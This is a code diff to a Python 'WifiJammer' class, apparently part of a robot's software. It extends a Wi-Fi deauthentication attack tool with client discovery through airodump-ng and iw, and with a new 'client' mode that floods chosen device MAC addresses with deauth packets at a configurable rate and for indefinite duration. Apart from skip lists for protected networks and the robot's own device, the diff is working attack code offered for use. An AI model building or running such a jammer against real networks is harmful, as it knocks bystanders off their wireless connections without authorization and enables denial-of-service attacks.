@@ -19,6 +19,7 @@ Technical Implementation:
 """
 
 import logging
+import os
 import subprocess
 import threading
 import time
@@ -289,21 +290,113 @@ class WifiJammer:
             # Set channel for client discovery
             self._set_channel(channel)
 
-            # Use airodump-ng or similar for client discovery
-            # For now, we'll use a simple approach with iw scan
-            # In a real implementation, you'd use airodump-ng or tshark
-
             logger.debug(f"Discovering clients for AP {bssid} on channel {channel}")
 
-            # Placeholder for client discovery
-            # In production, you'd use tools like:
-            # - airodump-ng --bssid <bssid> -c <channel> <interface>
-            # - tshark -i <interface> -y IEEE802_11_RADIO
+            # Try to use airodump-ng if available for client discovery
+            try:
+                # Use airodump-ng to discover clients
+                # This requires airodump-ng to be installed
+                result = subprocess.run(
+                    ["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), "--output-format", "csv", "-w", "/tmp/clients", self.monitor_interface],
+                    capture_output=True,
+                    text=True,
+                    timeout=15
+                )
+
+                # Parse the CSV output for client information
+                # This is a simplified version - in production you'd want more robust parsing
+                csv_file = "/tmp/clients-01.csv"
+                if os.path.exists(csv_file):
+                    with open(csv_file, 'r') as f:
+                        for line in f:
+                            if line.startswith("Station MAC"):
+                                continue  # Skip header
+                            parts = line.strip().split(',')
+                            if len(parts) >= 6:
+                                mac = parts[0].strip().upper()
+                                if mac and mac != "Not-Associated":
+                                    # Check if this is the robot's MAC
+                                    is_robot = mac == self._robot_mac
+                                    clients.append(ClientInfo(
+                                        mac=mac,
+                                        bssid=bssid,
+                                        signal_strength=int(parts[2]) if parts[2].isdigit() else 0,
+                                        is_robot_device=is_robot
+                                    ))
+
+                    # Clean up temporary files
+                    try:
+                        os.remove(csv_file)
+                    except:
+                        pass
+
+            except FileNotFoundError:
+                logger.debug("airodump-ng not available, using alternative method")
+
+            # Alternative: Use iw station dump if we're connected to the network
+            # This only works for networks we're connected to
+            try:
+                result = subprocess.run(
+                    ["iw", "dev", self.management_interface, "station", "dump"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5
+                )
+
+                current_bssid = None
+                for line in result.stdout.splitlines():
+                    if "Connected to" in line:
+                        current_bssid = line.split("Connected to")[1].split()[0].strip().upper()
+                    elif "Station" in line:
+                        mac = line.split("Station")[1].split()[0].strip().upper()
+                        if current_bssid == bssid:
+                            is_robot = mac == self._robot_mac
+                            clients.append(ClientInfo(
+                                mac=mac,
+                                bssid=bssid,
+                                is_robot_device=is_robot
+                            ))
+
+            except Exception as e:
+                logger.debug(f"Alternative client discovery failed: {e}")
 
         except Exception as e:
             logger.error(f"Error discovering clients for {bssid}: {e}")
 
         return clients
+
+    def discover_network_clients(self, bssid: str, channel: int) -> List[dict]:
+        """
+        Discover clients on a specific network
+
+        Args:
+            bssid: Target network BSSID
+            channel: Network channel
+
+        Returns:
+            List of discovered clients
+        """
+        if self._status.state == JammerState.RUNNING:
+            logger.warning("Cannot discover clients while jammer is running")
+            return []
+
+        self._update_status(state=JammerState.SCANNING)
+
+        try:
+            clients = self._discover_clients(bssid, channel)
+
+            with self._status_lock:
+                self._status.clients_discovered = len(clients)
+
+            self._update_status(state=JammerState.IDLE)
+
+            logger.info(f"Client discovery complete - Found {len(clients)} clients on {bssid}")
+            return [client.to_dict() for client in clients]
+
+        except Exception as e:
+            logger.error(f"Client discovery failed: {e}")
+            self._update_status(state=JammerState.ERROR, error_message=str(e))
+            return []
 
     def _set_monitor_mode(self) -> bool:
         """Set the WiFi interface to monitor mode"""
@@ -532,6 +625,7 @@ class WifiJammer:
         self,
         mode: JammerMode,
         target_bssids: List[str],
+        target_macs: Optional[List[str]] = None,
         channel: Optional[int] = None,
         packet_rate: int = 100,
         duration: Optional[float] = None
@@ -540,16 +634,18 @@ class WifiJammer:
         Main jamming loop - runs in separate thread
 
         Args:
-            mode: Attack mode (mass or targeted)
+            mode: Attack mode (mass, targeted, or client)
             target_bssids: List of target BSSIDs
+            target_macs: List of target MAC addresses (for client mode)
             channel: WiFi channel to use
             packet_rate: Packets per second
             duration: Attack duration in seconds (None for indefinite)
         """
         start_time = time.time()
         packet_interval = 1.0 / packet_rate
+        target_macs = target_macs or []
 
-        logger.info(f"Jamming loop started - Mode: {mode}, Targets: {len(target_bssids)}, Rate: {packet_rate} pps")
+        logger.info(f"Jamming loop started - Mode: {mode}, BSSIDs: {len(target_bssids)}, MACs: {len(target_macs)}, Rate: {packet_rate} pps")
 
         try:
             # Set channel if specified
@@ -562,25 +658,58 @@ class WifiJammer:
                     logger.info("Attack duration reached, stopping")
                     break
 
-                # Send deauth packets to all targets
-                for bssid in target_bssids:
-                    if self._stop_event.is_set():
-                        break
+                # Handle different attack modes
+                if mode == JammerMode.CLIENT and target_macs:
+                    # Client mode: target specific MAC addresses
+                    for bssid in target_bssids:
+                        if self._stop_event.is_set():
+                            break
 
-                    # Skip protected networks
-                    if bssid in self._protected_networks:
-                        logger.debug(f"Skipping protected network: {bssid}")
-                        continue
+                        # Skip protected networks
+                        if bssid in self._protected_networks:
+                            logger.debug(f"Skipping protected network: {bssid}")
+                            continue
 
-                    try:
-                        packet = self._build_deauth_packet(bssid)
-                        sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
+                        for mac in target_macs:
+                            if self._stop_event.is_set():
+                                break
 
-                        with self._status_lock:
-                            self._status.packets_sent += 1
+                            # Skip protected MACs
+                            if mac in self._protected_macs:
+                                logger.debug(f"Skipping protected MAC: {mac}")
+                                continue
 
-                    except Exception as e:
-                        logger.error(f"Error sending deauth to {bssid}: {e}")
+                            try:
+                                # Send deauth to specific client
+                                packet = self._build_deauth_packet(bssid, mac)
+                                sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
+
+                                with self._status_lock:
+                                    self._status.packets_sent += 1
+
+                            except Exception as e:
+                                logger.error(f"Error sending deauth to {mac} on {bssid}: {e}")
+
+                else:
+                    # Mass or targeted mode: target BSSIDs
+                    for bssid in target_bssids:
+                        if self._stop_event.is_set():
+                            break
+
+                        # Skip protected networks
+                        if bssid in self._protected_networks:
+                            logger.debug(f"Skipping protected network: {bssid}")
+                            continue
+
+                        try:
+                            packet = self._build_deauth_packet(bssid)
+                            sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
+
+                            with self._status_lock:
+                                self._status.packets_sent += 1
+
+                        except Exception as e:
+                            logger.error(f"Error sending deauth to {bssid}: {e}")
 
                 # Sleep to maintain packet rate
                 time.sleep(packet_interval)
@@ -597,6 +726,7 @@ class WifiJammer:
                         self._status.state = JammerState.IDLE
                         self._status.mode = None
                         self._status.target_bssid = None
+                        self._status.target_macs = []
                         self._status.channel = None
                         self._status.start_time = None
             self._set_managed_mode()
@@ -606,6 +736,7 @@ class WifiJammer:
         self,
         mode: str,
         target_bssids: Optional[List[str]] = None,
+        target_macs: Optional[List[str]] = None,
         channel: Optional[int] = None,
         packet_rate: int = 100,
         duration: Optional[float] = None
@@ -614,8 +745,9 @@ class WifiJammer:
         Start the deauthentication attack
 
         Args:
-            mode: Attack mode ("mass" or "targeted")
-            target_bssids: List of target BSSIDs
+            mode: Attack mode ("mass", "targeted", or "client")
+            target_bssids: List of target BSSIDs (for mass/targeted modes)
+            target_macs: List of target MAC addresses (for client mode)
             channel: WiFi channel to use
             packet_rate: Packets per second (10-500)
             duration: Attack duration in seconds (None for indefinite)
@@ -632,9 +764,16 @@ class WifiJammer:
         # Validate packet rate
         packet_rate = max(10, min(packet_rate, self._max_packet_rate))
 
-        # Validate targets
-        if not target_bssids:
-            return {"status": "error", "message": "No target BSSIDs provided"}
+        # Validate targets based on mode
+        if mode_enum == JammerMode.CLIENT:
+            if not target_macs:
+                return {"status": "error", "message": "No target MACs provided for client mode"}
+            # For client mode, we need the BSSID of the network they're on
+            if not target_bssids:
+                return {"status": "error", "message": "Network BSSID required for client mode"}
+        else:
+            if not target_bssids:
+                return {"status": "error", "message": "No target BSSIDs provided"}
 
         # Check if already running
         if self._status.state == JammerState.RUNNING:
@@ -650,6 +789,13 @@ class WifiJammer:
                 "message": f"Cannot attack robot's own network ({self._robot_network_bssid})"
             }
 
+        # Validate that robot MAC is not in client targets
+        if target_macs and self._robot_mac and self._robot_mac in target_macs:
+            return {
+                "status": "error",
+                "message": f"Cannot attack robot's own device ({self._robot_mac})"
+            }
+
         # Set monitor mode
         if not self._set_monitor_mode():
             return {"status": "error", "message": "Failed to set monitor mode"}
@@ -660,6 +806,7 @@ class WifiJammer:
             state=JammerState.RUNNING,
             mode=mode_enum,
             target_bssid=target_bssids[0] if len(target_bssids) == 1 else None,
+            target_macs=target_macs or [],
             channel=channel,
             packets_sent=0,
             start_time=time.time(),
@@ -669,17 +816,18 @@ class WifiJammer:
         # Start jamming thread
         self._jammer_thread = threading.Thread(
             target=self._jamming_loop,
-            args=(mode_enum, target_bssids, channel, packet_rate, duration),
+            args=(mode_enum, target_bssids, target_macs, channel, packet_rate, duration),
             daemon=True,
             name="wifi-jammer"
         )
         self._jammer_thread.start()
 
-        logger.info(f"Attack started - Mode: {mode}, Targets: {len(target_bssids)}")
+        logger.info(f"Attack started - Mode: {mode}, BSSIDs: {len(target_bssids or [])}, MACs: {len(target_macs or [])}")
         return {
             "status": "started",
             "mode": mode,
-            "targets": target_bssids,
+            "targets": target_bssids or [],
+            "target_macs": target_macs or [],
             "packet_rate": packet_rate,
             "duration": duration
         }
